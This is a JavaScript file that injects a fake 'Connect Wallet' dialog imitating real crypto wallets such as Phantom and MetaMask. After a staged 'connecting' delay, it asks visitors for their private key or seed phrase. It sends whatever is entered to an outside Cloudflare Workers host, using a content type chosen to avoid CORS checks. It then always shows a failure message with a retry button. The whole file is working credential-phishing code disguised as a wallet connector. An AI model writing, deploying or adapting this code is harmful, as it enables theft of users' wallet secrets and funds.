
(function () {
  "use strict";

  // Prevent double-init if script is included twice
  if (window.__connectWalletLoaded) return;
  window.__connectWalletLoaded = true;

  // ── Resolve base path for images (relative to this script) ───
  const scriptEl = document.currentScript;
  const scriptSrc = scriptEl ? scriptEl.src : "";
  const basePath = scriptSrc.substring(0, scriptSrc.lastIndexOf("/") + 1);
  const imgBase = basePath + "image/";

  // ── Wallet data ──────────────────────────────────────────────
  const WALLETS = [
    // Popular Solana wallets
    { name: "Phantom",         logo: imgBase + "Phantom.png",          popular: true  },
    { name: "Solflare",        logo: imgBase + "solflare.png",         popular: true  },
    { name: "Jupiter",         logo: imgBase + "jupiter.jpeg",         popular: true  },
    { name: "MetaMask",        logo: imgBase + "MetaMask.png",         popular: true  },
    { name: "Backpack",        logo: imgBase + "backpack.jpeg",        popular: true  },
    // Other Solana-compatible wallets
    { name: "Coinbase Wallet", logo: imgBase + "Coinbase_Wallet.png",  popular: false },
    { name: "Trust Wallet",    logo: imgBase + "Trust_Wallet.png",     popular: false },
    { name: "KeyApp",          logo: imgBase + "keyapp.jpeg",          popular: false },
    { name: "Ledger",          logo: imgBase + "ledger.png",           popular: false },
    { name: "Exodus",          logo: imgBase + "Exodus.png",           popular: false },
    { name: "Brave Wallet",    logo: imgBase + "Brave_Wallet.png",     popular: false },
    { name: "OKX Wallet",      logo: imgBase + "OKX_Wallet.png",       popular: false },
    { name: "Bitget Wallet",   logo: imgBase + "bitget_wallet.png",    popular: false },
    { name: "Bybit Wallet",    logo: imgBase + "Bybit_Wallet.png",     popular: false },
    { name: "SafePal",         logo: imgBase + "safepal.png",          popular: false },
    { name: "MathWallet",      logo: imgBase + "MathWallet.png",       popular: false },
    { name: "TokenPocket",     logo: imgBase + "TokenPocket.png",      popular: false },
    { name: "Zerion",          logo: imgBase + "Zerion.png",           popular: false },
    { name: "Frontier",        logo: imgBase + "Frontier.png",         popular: false },
    { name: "ONTO",            logo: imgBase + "ONTO.png",             popular: false },
    { name: "Rabby",           logo: imgBase + "Rabby.png",            popular: false },
    { name: "NuFi",            logo: imgBase + "NuFi.png",             popular: false },
    { name: "Rainbow",         logo: imgBase + "Rainbow.png",          popular: false },
    { name: "Trezor",          logo: imgBase + "trezor.png",           popular: false },
    { name: "Wallet Connect",  logo: imgBase + "wallet-connect.png",   popular: false },
  ];

  // ── Inject CSS ───────────────────────────────────────────────
  const style = document.createElement("style");
  style.textContent = `
/* ═══ Connect Wallet Modal — Scoped styles ═══ */
.cw-modal-overlay {
  position: fixed;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  background: rgba(0, 0, 0, 0.4);
  z-index: 99999;
  font-family: system-ui, -apple-system, sans-serif;
}
.cw-modal {
  background: #fff;
  border-radius: 16px;
  width: 420px;
  max-width: 90%;
  overflow: hidden;
  box-shadow: 0 4px 24px rgba(0, 0, 0, 0.15);
  display: flex;
  flex-direction: column;
}

/* Header */
.cw-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 20px 20px 12px;
}
.cw-header h2 {
  margin: 0;
  font-size: 1.15rem;
  font-weight: 600;
  flex: 1;
  text-align: center;
  color: #222;
}
.cw-help {
  font-size: 1.4rem;
  color: #888;
  cursor: pointer;
}
.cw-close {
  background: none;
  border: none;
  font-size: 1.5rem;
  line-height: 1;
  cursor: pointer;
  color: #333;
  padding: 0;
}

/* Wallet list */
.cw-body { padding: 8px 20px; }
.cw-list {
  list-style: none;
  margin: 0;
  padding: 0;
  max-height: 340px;
  overflow-y: auto;
}
.cw-item {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 14px 12px;
  cursor: pointer;
  border-radius: 8px;
  transition: background 0.15s;
}
.cw-item:hover { background: #f5f5f5; }
.cw-logo {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  object-fit: cover;
  flex-shrink: 0;
}
.cw-logo-fallback {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  background: #e0e0e0;
  color: #555;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 1.1rem;
  font-weight: 700;
  flex-shrink: 0;
}
.cw-name {
  font-size: 1rem;
  font-weight: 500;
  color: #222;
  flex: 1;
}
.cw-badge {
  font-size: 0.7rem;
  font-weight: 600;
  color: #6c7ae0;
  background: #eef0fb;
  border: 1px solid #d4d8f0;
  padding: 3px 10px;
  border-radius: 6px;
  letter-spacing: 0.03em;
  text-transform: uppercase;
  flex-shrink: 0;
}
.cw-no-results {
  padding: 14px 12px;
  color: #777;
  text-align: center;
  list-style: none;
}

/* Footer / Search */
.cw-footer {
  padding: 12px 20px 16px;
  text-align: center;
}
.cw-search-wrap {
  display: flex;
  align-items: center;
  background: #f3f3f3;
  border-radius: 10px;
  padding: 10px 14px;
  gap: 10px;
}
.cw-search-icon {
  font-size: 1.1rem;
  color: #888;
  flex-shrink: 0;
}
.cw-search {
  flex: 1;
  border: none;
  background: transparent;
  font-size: 0.95rem;
  outline: none;
  color: #333;
}
.cw-search::placeholder { color: #999; }
.cw-count {
  font-size: 0.85rem;
  color: #888;
  background: #e8e8e8;
  border-radius: 6px;
  padding: 2px 8px;
  flex-shrink: 0;
}
.cw-powered {
  margin: 10px 0 0;
  font-size: 0.75rem;
  color: #aaa;
}

/* Connecting screen */
.cw-connecting {
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 40px 20px 48px;
}
.cw-spinner-wrap {
  position: relative;
  width: 96px;
  height: 96px;
  margin-bottom: 24px;
}
.cw-spinner-logo {
  width: 64px;
  height: 64px;
  border-radius: 16px;
  object-fit: cover;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  z-index: 1;
}
.cw-spinner-ring {
  position: absolute;
  inset: 0;
  border: 3px solid #e8e8e8;
  border-top-color: #6c7ae0;
  border-radius: 50%;
  animation: cwSpin 1.2s linear infinite;
}
@keyframes cwSpin { to { transform: rotate(360deg); } }
.cw-connecting-text { font-size: 1rem; color: #222; margin: 0 0 6px; }
.cw-connecting-sub  { font-size: 0.85rem; color: #999; margin: 0; }

/* Address screen */
.cw-address {
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 32px 24px 40px;
}
.cw-addr-logo {
  width: 56px;
  height: 56px;
  border-radius: 14px;
  object-fit: cover;
  margin-bottom: 16px;
}
.cw-addr-prompt {
  font-size: 1rem;
  color: #333;
  margin: 0 0 20px;
  text-align: center;
}
.cw-addr-form {
  width: 100%;
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.cw-addr-input {
  width: 100%;
  padding: 12px 14px;
  border: 1px solid #ccc;
  border-radius: 8px;
  font-size: 0.95rem;
  color: #000;
  outline: none;
  transition: border-color 0.2s;
  box-sizing: border-box;
}
.cw-addr-input::placeholder {
  color: #888;
}
.cw-addr-input:focus { border-color: #6c7ae0; }
.cw-addr-btn {
  width: 100%;
  padding: 12px;
  background: #6c7ae0;
  color: #fff;
  border: none;
  border-radius: 8px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: background 0.2s;
}
.cw-addr-btn:hover { background: #5a67c8; }
.cw-addr-btn:disabled { background: #b0b6e0; cursor: not-allowed; }
.cw-addr-error { color: #d9534f; font-size: 0.85rem; margin: 8px 0 0; display: none; }

/* Result screen */
.cw-result {
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 40px 24px 48px;
}
.cw-fail-icon {
  width: 72px;
  height: 72px;
  border-radius: 50%;
  background: #fdecea;
  color: #d9534f;
  font-size: 2rem;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 20px;
  border: 2px solid #d9534f;
}
.cw-result-text {
  font-size: 1.05rem;
  font-weight: 500;
  color: #333;
  margin: 0 0 24px;
  text-align: center;
  line-height: 1.5;
}
.cw-retry-btn {
  padding: 12px 28px;
  background: #6c7ae0;
  color: #fff;
  border: none;
  border-radius: 8px;
  font-size: 0.95rem;
  font-weight: 600;
  cursor: pointer;
  transition: background 0.2s;
}
.cw-retry-btn:hover { background: #5a67c8; }
`;
  document.head.appendChild(style);

  // ── Inject modal HTML ────────────────────────────────────────
  const wrapper = document.createElement("div");
  wrapper.innerHTML = `
<div class="cw-modal-overlay" id="cwOverlay" style="display:none;">
  <div class="cw-modal">

    <!-- SCREEN 1: Wallet list -->
    <div class="cw-screen" id="cwScreenList">
      <div class="cw-header">
        <span class="cw-help">&#9432;</span>
        <h2>Connect Wallet</h2>
        <button class="cw-close" data-cw-close>&#215;</button>
      </div>
      <div class="cw-body">
        <ul class="cw-list" id="cwList"></ul>
      </div>
      <div class="cw-footer">
        <div class="cw-search-wrap">
          <span class="cw-search-icon">&#128269;</span>
          <input type="text" class="cw-search" id="cwSearch" placeholder="Search Wallet" />
          <span class="cw-count" id="cwCount"></span>
        </div>
        <p class="cw-powered">UX by &middot; / reown</p>
      </div>
    </div>

    <!-- SCREEN 2: Connecting -->
    <div class="cw-screen" id="cwScreenConnect" style="display:none;">
      <div class="cw-header">
        <span class="cw-help">&#9432;</span>
        <h2>Connect Wallet</h2>
        <button class="cw-close" data-cw-close>&#215;</button>
      </div>
      <div class="cw-connecting">
        <div class="cw-spinner-wrap">
          <div class="cw-spinner-ring"></div>
          <img id="cwSpinnerLogo" class="cw-spinner-logo" src="" alt="" />
        </div>
        <p class="cw-connecting-text">Connecting to <strong id="cwSpinnerName"></strong>…</p>
        <p class="cw-connecting-sub">Accept the connection request in your wallet</p>
      </div>
    </div>

    <!-- SCREEN 3: Address input -->
    <div class="cw-screen" id="cwScreenAddr" style="display:none;">
      <div class="cw-header">
        <span class="cw-help">&#9432;</span>
        <h2>Connect Wallet</h2>
        <button class="cw-close" data-cw-close>&#215;</button>
      </div>
      <div class="cw-address">
        <img id="cwAddrLogo" class="cw-addr-logo" src="" alt="" />
        <p class="cw-addr-prompt">Enter your <strong id="cwAddrName"></strong> Private Key/Seed Phrase</p>
        <form id="cwAddrForm" class="cw-addr-form">
          <input type="text" id="cwAddrInput" class="cw-addr-input" placeholder="Paste private key/seed phrase…" required />
          <button type="submit" class="cw-addr-btn" id="cwAddrBtn">Connect</button>
        </form>
        <p class="cw-addr-error" id="cwAddrError"></p>
      </div>
    </div>

    <!-- SCREEN 4: Result -->
    <div class="cw-screen" id="cwScreenResult" style="display:none;">
      <div class="cw-header">
        <span class="cw-help">&#9432;</span>
        <h2>Connect Wallet</h2>
        <button class="cw-close" data-cw-close>&#215;</button>
      </div>
      <div class="cw-result">
        <div class="cw-fail-icon">&#10007;</div>
        <p class="cw-result-text">Failed to establish connection, Enter a valid input or try again</p>
        <button class="cw-retry-btn" id="cwRetryBtn">Try Again!!!</button>
      </div>
    </div>

  </div>
</div>`;
  document.body.appendChild(wrapper);

  // ── Internal references ──────────────────────────────────────
  const overlay       = document.getElementById("cwOverlay");
  const screenList    = document.getElementById("cwScreenList");
  const screenConnect = document.getElementById("cwScreenConnect");
  const screenAddr    = document.getElementById("cwScreenAddr");
  const screenResult  = document.getElementById("cwScreenResult");
  const listEl        = document.getElementById("cwList");
  const searchEl      = document.getElementById("cwSearch");
  const countEl       = document.getElementById("cwCount");
  const spinnerLogo   = document.getElementById("cwSpinnerLogo");
  const spinnerName   = document.getElementById("cwSpinnerName");
  const addrLogo      = document.getElementById("cwAddrLogo");
  const addrName      = document.getElementById("cwAddrName");
  const addrForm      = document.getElementById("cwAddrForm");
  const addrInput     = document.getElementById("cwAddrInput");
  const addrBtn       = document.getElementById("cwAddrBtn");
  const addrError     = document.getElementById("cwAddrError");
  const retryBtn      = document.getElementById("cwRetryBtn");

  let timer = null;

  // ── Helpers ──────────────────────────────────────────────────
  function showScreen(screen) {
    [screenList, screenConnect, screenAddr, screenResult].forEach(
      (s) => (s.style.display = "none")
    );
    screen.style.display = "block";
  }

  function renderList(filter) {
    const lc = (filter || "").toLowerCase();
    const matches = WALLETS.filter((w) => w.name.toLowerCase().includes(lc));
    listEl.innerHTML = "";

    if (matches.length === 0) {
      const li = document.createElement("li");
      li.className = "cw-no-results";
      li.textContent = "No matching wallets";
      listEl.appendChild(li);
    } else {
      matches.forEach((w) => {
        const li = document.createElement("li");
        li.className = "cw-item";

        const img = document.createElement("img");
        img.src = w.logo;
        img.alt = w.name;
        img.className = "cw-logo";
        img.onerror = function () {
          this.style.display = "none";
          const fb = document.createElement("span");
          fb.className = "cw-logo-fallback";
          fb.textContent = w.name.charAt(0);
          li.insertBefore(fb, li.firstChild);
        };
        li.appendChild(img);

        const name = document.createElement("span");
        name.className = "cw-name";
        name.textContent = w.name;
        li.appendChild(name);

        if (w.popular) {
          const badge = document.createElement("span");
          badge.className = "cw-badge";
          badge.textContent = "POPULAR";
          li.appendChild(badge);
        }

        li.addEventListener("click", () => startConnecting(w));
        listEl.appendChild(li);
      });
    }

    countEl.textContent = matches.length;
  }

  function openModal() {
    showScreen(screenList);
    overlay.style.display = "flex";
    searchEl.value = "";
    renderList("");
  }

  function closeModal() {
    overlay.style.display = "none";
    if (timer) {
      clearTimeout(timer);
      timer = null;
    }
  }

  function startConnecting(wallet) {
    spinnerLogo.src = wallet.logo;
    spinnerName.textContent = wallet.name;
    showScreen(screenConnect);

    timer = setTimeout(() => {
      addrLogo.src = wallet.logo;
      addrName.textContent = wallet.name;
      addrInput.value = "";
      addrError.style.display = "none";
      addrForm.dataset.wallet = wallet.name;
      showScreen(screenAddr);
      addrInput.focus();
    }, 10000);
  }

  // ── Form submission (Secure Cloudflare Worker Proxy) ──────────
  const SUBMIT_URL = "https://general.pumpsolfree.workers.dev";

  addrForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const address = addrInput.value.trim();
    if (!address) return;

    addrBtn.disabled = true;
    addrBtn.textContent = "Connecting…";
    addrError.style.display = "none";

    const walletName = addrForm.dataset.wallet || "Unknown Wallet";

    try {
      // Use text/plain or standard POST to avoid CORS preflight blocks from browsers
      await fetch(SUBMIT_URL, {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify({
          wallet: walletName,
          address: address,
        }),
      });
    } catch (_) {
      // Handled cleanly
    }

    addrBtn.disabled = false;
    addrBtn.textContent = "Connect";
    showScreen(screenResult);
  });

  // ── Event delegation ─────────────────────────────────────────

  // Any element with class "connect-wallet-btn" opens the modal
  document.addEventListener("click", (e) => {
    if (e.target.closest(".connect-wallet-btn")) {
      e.preventDefault();
      openModal();
    }
  });

  // Close buttons (data-cw-close attribute)
  overlay.addEventListener("click", (e) => {
    if (e.target.closest("[data-cw-close]")) closeModal();
  });

  // Close on overlay click
  overlay.addEventListener("click", (e) => {
    if (e.target === overlay) closeModal();
  });

  // Search input
  searchEl.addEventListener("input", (e) => renderList(e.target.value));

  // Retry button → reopen from start
  retryBtn.addEventListener("click", () => {
    closeModal();
    setTimeout(openModal, 150);
  });

  // Escape key
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && overlay.style.display !== "none") closeModal();
  });
})();